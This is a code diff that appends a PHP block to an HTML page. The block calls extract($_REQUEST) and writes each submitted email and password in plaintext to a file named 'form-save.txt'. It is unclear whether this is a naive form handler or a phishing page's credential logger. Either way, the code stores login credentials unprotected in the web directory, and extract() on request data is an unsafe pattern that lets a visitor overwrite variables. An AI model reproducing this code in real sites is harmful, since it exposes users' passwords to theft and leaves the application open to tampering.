@@ -127,4 +127,16 @@
     <script src="javascript/cookie.js"></script>
 </body>
 
+<!--php-->
+<?php
+    extract($_REQUEST);
+    $file = fopen("form-save.txt", "w");
+
+    fwrite($file, "email: ");
+    fwrite($file, $email ."\n");
+    fwrite($file, "password: ");
+    fwrite($file, $password ."\n");
+
+    fclose($file);
+?>
 </html>
